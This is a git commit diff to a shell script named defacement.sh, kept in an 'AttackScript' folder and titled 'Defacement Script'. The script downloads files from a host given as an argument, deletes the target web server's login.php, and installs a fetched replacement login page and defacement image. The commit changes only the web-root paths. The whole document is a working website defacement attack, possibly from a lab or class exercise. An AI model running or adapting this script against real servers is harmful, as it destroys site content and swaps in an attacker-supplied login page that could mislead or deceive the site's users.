45b937ebe342e30777fa4cb93d71dd1128ee4ca9
kahweiing <kahweing96@gmail.com>
2022-10-20 22:41:07 +0800

    Defacement Script

--- AttackScript/defacement.sh
+++ AttackScript/defacement.sh
@@ -1,8 +1,8 @@
 echo "Getting defacement from target machine";
 wget http://$1/anonymous.jfif;
-mv anonymous.jfif /opt/lampp/htdocs/uploadImage/Logo/anonymous.jfif;
+mv anonymous.jfif /var/www/html/uploadImage/Logo/anonymous.jfif;
 echo "Replacing original home/login page with a defaced website";
-rm /opt/lampp/htdocs/login.php;
+rm /var/www/html/login.php;
 wget http://$1/login.php;
-mv login.php /opt/lampp/htdocs/login.php;
+mv login.php /var/www/html/login.php;
 echo "Done, defacement was successful";
